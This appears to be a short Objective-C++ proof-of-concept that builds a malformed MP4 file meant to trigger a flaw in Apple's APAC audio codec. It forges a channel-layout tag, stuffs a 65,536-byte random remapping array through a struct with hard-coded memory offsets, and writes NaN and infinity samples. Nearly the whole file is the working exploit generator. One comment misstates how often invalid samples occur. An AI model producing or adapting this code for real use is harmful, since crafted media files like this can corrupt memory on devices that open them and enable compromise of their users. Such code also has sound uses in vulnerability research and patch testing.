@import AVFAudio;
@import AudioToolbox;
#include <vector>
#include <random>

struct CodecConfig {
  char padding0[0x78];
  AudioChannelLayout* remappingChannelLayout;
  char padding1[0xe0 - 0x80];
  std::vector<char> mRemappingArray;
};

void OverrideApac(CodecConfig* config) {
  config->remappingChannelLayout->mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8;
  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_int_distribution<> dis(0, 255);
  for (int i = 0; i < 0x10000; i++) {
    config->mRemappingArray.push_back(static_cast<char>(dis(gen)));
  }
}

int main() {
  uint32_t channelNum = 1;
  AVAudioFormat* formatIn = [[AVAudioFormat alloc] initStandardFormatWithSampleRate:44100
                                                                           channels:channelNum];
  AudioStreamBasicDescription outputDescription{.mSampleRate = 44100,
                                               .mFormatID = kAudioFormatAPAC,
                                               .mFormatFlags = 0,
                                               .mBytesPerPacket = 0,
                                               .mFramesPerPacket = 0,
                                               .mBytesPerFrame = 0,
                                               .mChannelsPerFrame = channelNum,
                                               .mBitsPerChannel = 0,
                                               .mReserved = 0};
  AVAudioChannelLayout* channelLayout =
      [AVAudioChannelLayout layoutWithLayoutTag:kAudioChannelLayoutTag_HOA_ACN_SN3D | 1];

  CodecConfig config;
  config.remappingChannelLayout = channelLayout.layout;
  OverrideApac(&config);

  NSURL* outUrl = [NSURL fileURLWithPath:@"output_malformed.mp4"];
  ExtAudioFileRef audioFile = nullptr;
  OSStatus status = ExtAudioFileCreateWithURL((__bridge CFURLRef)outUrl, kAudioFileMPEG4Type,
                                              &outputDescription, channelLayout.layout,
                                              kAudioFileFlags_EraseFile, &audioFile);
  if (status) {
    fprintf(stderr, "Error creating file: %x\n", status);
    return 1;
  }

  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientDataFormat,
                                   sizeof(AudioStreamBasicDescription), formatIn.streamDescription);
  if (status) {
    fprintf(stderr, "Error setting format: %x\n", status);
    ExtAudioFileDispose(audioFile);
    return 1;
  }

  status = ExtAudioFileSetProperty(audioFile, kExtAudioFileProperty_ClientChannelLayout,
                                   sizeof(AudioChannelLayout), formatIn.channelLayout.layout);
  if (status) {
    fprintf(stderr, "Error setting layout: %x\n", status);
    ExtAudioFileDispose(audioFile);
    return 1;
  }

  std::random_device rd;
  std::mt19937 gen(rd());
  std::uniform_real_distribution<float> dis(-1.0f, 1.0f);
  float audioBuffer[44100];
  for (int i = 0; i < 44100; ++i) {
    if (i % 100 == 0 && dis(gen) > 0.9f) { // 10% chance of invalid values
      audioBuffer[i] = std::numeric_limits<float>::quiet_NaN();
    } else if (i % 100 == 1 && dis(gen) > 0.9f) {
      audioBuffer[i] = std::numeric_limits<float>::infinity();
    } else {
      audioBuffer[i] = dis(gen);
    }
  }
  AudioBufferList audioBufferList{
      .mNumberBuffers = 1,
      .mBuffers = {{.mNumberChannels = channelNum, .mDataByteSize = sizeof(audioBuffer), .mData = audioBuffer}},
  };
  status = ExtAudioFileWrite(audioFile, sizeof(audioBuffer) / sizeof(audioBuffer[0]), &audioBufferList);
  if (status) {
    fprintf(stderr, "Error writing audio: %x\n", status);
  }

  status = ExtAudioFileDispose(audioFile);
  if (status) {
    fprintf(stderr, "Error closing file: %x\n", status);
  }
  return 0;
}
